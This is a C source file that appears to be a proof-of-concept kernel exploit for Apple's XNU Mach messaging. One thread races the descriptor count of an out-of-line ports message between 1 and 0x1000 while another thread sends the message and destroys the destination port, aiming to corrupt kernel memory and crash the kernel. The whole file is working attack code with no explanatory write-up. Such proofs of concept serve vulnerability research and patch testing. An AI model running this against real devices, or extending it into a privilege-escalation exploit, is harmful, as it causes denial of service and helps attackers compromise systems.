#include <stdlib.h>
#include <stdio.h>
#include <pthread/pthread.h>
#include <mach/mach.h>

struct ool_msg  {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports[];
};

mach_port_t new_mach_port() {
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (ret) {
        printf("[-] failed to allocate port\n");
        return MACH_PORT_NULL;
    }
    
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (ret) {
        printf("[-] failed to insert right\n");
        mach_port_destroy(mach_task_self(), port);
        return MACH_PORT_NULL;
    }
    
    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    ret = mach_port_set_attributes(mach_task_self(), port, MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, MACH_PORT_LIMITS_INFO_COUNT);
    if (ret) {
        printf("[-] failed to increase queue limit\n");
        mach_port_destroy(mach_task_self(), port);
        return MACH_PORT_NULL;
    }
    
    return port;
}

#define N_DESC 1
#define N_PORTS 0
#define N_CORRUPTED 0x1000

struct ool_msg *msg;
mach_port_t dest, target;

void race_thread() {
    while (1) {
        // change the descriptor count back and forth
        // eventually the race will work just right so we get this order of actions:
        // count = N_DESC -> first copyin -> count = N_CORRUPTED -> second copyin
        msg->body.msgh_descriptor_count = N_CORRUPTED;
        msg->body.msgh_descriptor_count = N_DESC;
    }
}

void main_thread() {
    while (1) {
        // create a mach port where we'll send the message
        dest = new_mach_port();
    
        // send
        msg->hdr.msgh_remote_port = dest;
        int ret = mach_msg(&msg->hdr, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, msg->hdr.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if (ret) printf("error: %s\n", mach_error_string(ret));
    
        // destroy the port to trigger the panic
        // note: don't receieve the message, that'll override ikm_header and stop the crash from happening
        printf("Destroying...\n");
        mach_port_destroy(mach_task_self(), dest);
        printf("Dead yet?\n");
    }
}

void poc() {
    printf("Crashing kernel...\n");
    
    // create a dummy port to send with the message
    target = new_mach_port();
    
    mach_port_t* ports = malloc(sizeof(mach_port_t) * N_PORTS);
    for (int i = 0; i < N_PORTS; i++) {
        ports[i] = target;
    }
    
    // set up an OOL ports message
    // make the size N_CORRUPTED because it's bigger, otherwise the message won't send and return an error.
    // this will make the allocation bigger but we don't care about tha as the out of bounds will be done to the left of the buffer, not to the right
    msg = (struct ool_msg*)calloc(1, sizeof(struct ool_msg) + sizeof(mach_msg_ool_ports_descriptor_t) * N_CORRUPTED);
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)(sizeof(struct ool_msg) + sizeof(mach_msg_ool_ports_descriptor_t) * N_CORRUPTED);
    msg->hdr.msgh_remote_port = 0;// dest[i];
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414141;
    
    // set the initial (smaller) descriptor count
    msg->body.msgh_descriptor_count = N_DESC;
    
    for (int i = 0; i < N_DESC; i++) {
        msg->ool_ports[i].address = ports;
        msg->ool_ports[i].count = N_PORTS;
        msg->ool_ports[i].deallocate = 0;
        msg->ool_ports[i].disposition = MACH_MSG_TYPE_COPY_SEND;
        msg->ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
        msg->ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;
    }
    
    // start the threads
    pthread_t thread, thread2;
    pthread_create(&thread, NULL, (void*)race_thread, NULL);
    pthread_create(&thread2, NULL, (void*)main_thread, NULL);
    
    pthread_join(thread, NULL);
}